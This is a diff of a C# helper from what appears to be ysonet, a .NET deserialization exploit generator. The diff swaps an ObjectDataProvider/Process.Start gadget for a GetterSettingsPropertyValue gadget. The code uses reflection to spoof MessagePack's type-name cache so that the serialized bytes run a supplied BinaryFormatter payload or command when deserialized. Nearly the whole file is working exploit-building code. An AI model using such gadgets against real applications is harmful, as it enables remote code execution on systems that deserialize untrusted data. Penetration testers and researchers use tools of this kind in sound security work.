@@ -1,6 +1,5 @@
 ﻿namespace ysonet.Helpers
 {
-    using Helpers.SurrogateClasses;
     using MessagePack;
     using MessagePack.Formatters;
     using MessagePack.Resolvers;
@@ -9,37 +8,33 @@
     using System.Reflection;
 
     /// <summary>
-    /// Helper methods for generating an ObjectDataProvider gadget with MessagePack (Typeless)
+    /// Helper methods for generating an GetterSettingsPropertyValue gadget with MessagePack (Typeless)
+    /// This version of gadget works for MessagePack >= 2.3.75, but may also work for older versions after some tweaking
     /// </summary>
-    internal static class MessagePackObjectDataProviderHelper
+    internal static class MessagePackGetterSettingsPropertyValueHelper
     {
         /// <summary>
-        /// Creates a serialized ObjectDataProvider gadget that when deserialized will execute the specified command.
+        /// Creates a serialized GetterSettingsPropertyValue gadget that when deserialized will execute the specified command.
         /// </summary>
-        /// <param name="pCmdFileName">The command filename.</param>
-        /// <param name="pCmdArguments">The command arguments.</param>
+        /// <param name="binaryFormatterGadget">Binary formatter gadget.</param>
         /// <param name="pUseLz4">Flag to use Lz4 compression. This works with both Lz4Block and Lz4BlockArray.</param>
         /// <returns>The serialized byte array.</returns>
-        internal static byte[] CreateObjectDataProviderGadget(string pCmdFileName, string pCmdArguments, bool pUseLz4)
+        internal static byte[] CreateGetterSettingsPropertyValueGadget(byte[] binaryFormatterGadget, bool pUseLz4)
         {
             SwapTypeCacheNames(
                 new Dictionary<Type, string>
                 {
                     {
-                        typeof(ObjectDataProviderSurrogate),
-                        "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
+                        typeof(SettingsPropertyValueSurrogate),
+                        "System.Configuration.SettingsPropertyValue, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"
                     },
                     {
-                        typeof(ProcessSurrogate),
-                        "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+                        typeof(PropertyGridSurrogate),
+                        "System.Windows.Forms.PropertyGrid, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"
                     },
-                    {
-                        typeof(ProcessStartInfoSurrogate),
-                        "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
-                    }
                 });
 
-            var odpInstance = CreateObjectDataProviderSurrogateInstance(pCmdFileName, pCmdArguments);
+            var odpInstance = CreateGetterSettingsPropertyValueSurrogateInstance(binaryFormatterGadget);
 
             MessagePackSerializerOptions options = pUseLz4
                 ? TypelessContractlessStandardResolver.Options.WithCompression(MessagePackCompression.Lz4BlockArray)
@@ -59,12 +54,12 @@
                 ? TypelessContractlessStandardResolver.Options.WithCompression(MessagePackCompression.Lz4BlockArray)
                 : TypelessContractlessStandardResolver.Options;
 
-            MessagePackSerializer.Deserialize<object>(pSerializedData, options);
+            Object obj = MessagePackSerializer.Deserialize<object>(pSerializedData, options);
         }
 
         /// <summary>
         /// Utilizes reflection to add values to the internal FullTypeNameCache that MessagePack uses to acquire cached type names for serialization.
-        /// This allows us to swap our surrogate ObjectDataProvider gadget type information with the real gadget AQNs when serialized.
+        /// This allows us to swap our surrogate GetterSettingsPropertyValue gadget type information with the real gadget AQNs when serialized.
         /// </summary>
         /// <param name="pNewTypeCacheEntries">
         /// The dictionary of type name cache entries to swap. 
@@ -90,25 +85,25 @@
         }
 
         /// <summary>
-        /// Creates a populated surrogate ObjectDataProvider instance which matches the object graph of the real ObjectDataProvider gadget.
+        /// Creates a populated surrogate GetterSettingsPropertyValue instance which matches the object graph of the real GetterSettingsPropertyValue gadget.
         /// </summary>
-        /// <param name="pCmdFileName">The command filename.</param>
-        /// <param name="pCmdArguments">The command arguments.</param>
-        /// <returns>The full ObjectDataProvider surrogate object graph.</returns>
-        private static object CreateObjectDataProviderSurrogateInstance(string pCmdFileName, string pCmdArguments)
+        /// <param name="binaryFormatterGadget">Binary formatter gadget.</param>
+        /// <returns>The full GetterSettingsPropertyValue surrogate object graph.</returns>
+        private static object CreateGetterSettingsPropertyValueSurrogateInstance(byte[] binaryFormatterGadget)
         {
-            return new ObjectDataProviderSurrogate
+
+            return new PropertyGridSurrogate
             {
-                MethodName = "Start",
-                ObjectInstance = new ProcessSurrogate
+                SelectedObjects = new object[]
                 {
-                    StartInfo = new ProcessStartInfoSurrogate
+                    new SettingsPropertyValueSurrogate
                     {
-                        FileName = pCmdFileName,
-                        Arguments = pCmdArguments
+                        Deserialized = false,
+                        SerializedValue = binaryFormatterGadget
                     }
                 }
             };
+
         }
     }
 }
